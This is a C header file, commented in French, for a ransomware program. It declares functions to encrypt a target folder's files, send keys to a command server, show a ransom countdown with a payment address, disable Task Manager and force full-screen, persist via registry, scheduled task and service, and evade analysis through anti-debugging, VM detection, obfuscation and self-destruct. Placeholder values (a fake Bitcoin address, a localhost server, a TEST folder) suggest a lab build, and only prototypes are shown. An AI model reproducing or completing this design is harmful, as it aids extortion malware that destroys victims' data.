#ifndef MAIN_H
#define MAIN_H

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sodium.h>
#include <winhttp.h>
#include <process.h>
#include <shlobj.h>
#include <tlhelp32.h>

// Définir UNICODE_BUILD pour utiliser Unicode
#define UNICODE_BUILD 1

// Version actuelle
#define VERSION "1.0.0"

// Macros pour obfuscation
#define OBFUSCATE_NAME(x) obf_##x
#define OBFUSCATE_STR(x) obfuscate_str(x)
#define TARGET_DIR "C:\\Users\\Public\\Documents\\TEST"
#define PAYMENT_ADDRESS "1FakeBitcoinAddr1234567890"
#define SERVER_URL L"127.0.0.1"
#define SERVER_PORT 5000
#define ENCRYPT_FILE OBFUSCATE_NAME(encrypt_file)
#define DECRYPT_FILE OBFUSCATE_NAME(decrypt_file)
#define SET_PERSISTENCE OBFUSCATE_NAME(set_persistence)
#define HTTP_POST OBFUSCATE_NAME(http_post)
#define HTTP_GET OBFUSCATE_NAME(http_get)

// Variables globales (externes)
extern HWND g_hwnd, g_label, g_info, g_timer_label;
extern time_t g_end_time;
extern uint8_t g_key[crypto_aead_chacha20poly1305_IETF_KEYBYTES];
extern char g_uuid[37];
extern int g_encrypted;
extern int g_payment_checked;
extern int g_fullscreen;
extern int g_disable_taskmgr;
extern int g_countdown_hours;
extern CRITICAL_SECTION g_cs;
extern HANDLE g_mutex;
extern int g_total_files;
extern int g_encrypted_files;
extern BOOL g_is_first_run;

// Fonctions de conversion d'encodage
wchar_t* AnsiToWide(const char* ansi);
char* WideToAnsi(const wchar_t* wide);

// Prototypes
char *obfuscate_str(const char *input);
char *deobfuscate_str(const char *input);
void generate_uuid(char *uuid);
void AntiDebug();
void CheckVirtualMachine();
void HideConsoleWindow();
void InitializeMutex();
void CleanupMutex();
void InsertJunkCode();
void RandomDelay();
void SimulateTorConnection(const char* message, char* response, size_t response_size);

int HTTP_POST(const char *uuid, const uint8_t *key, size_t key_len);
int HTTP_GET(const char *uuid, uint8_t *key, size_t key_len);
int SecureHttpPost(const char* url, const char* data, char* response, size_t response_size);
int CheckForUpdate(const char* current_version);

void ENCRYPT_FILE(const char *input_file, uint8_t *key, int encrypt);
void DECRYPT_FILE(const char *input_file, uint8_t *key);
int MultiThreadEncrypt(const char *target_dir, uint8_t *key);
int EncryptDirectory(const char *dir, uint8_t *key);
void DecryptDirectory(const char *dir, uint8_t *key);

void DisableTaskManager(BOOL disable);
void ForceFullScreen(HWND hwnd);
void SET_PERSISTENCE(void);
void SetMultipleRegistryEntries(const char *exePath);
void CreateScheduledTask(const char *exePath);
void InstallAsService(const char *exePath);
void SelfDestruct();
void CreateTestFiles(const char *dir);

// Fonctions pour l'interface
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void UpdateCountdown(HWND hwnd, time_t end_time);
void CheckPaymentStatus(HWND hwnd);

#endif // MAIN_H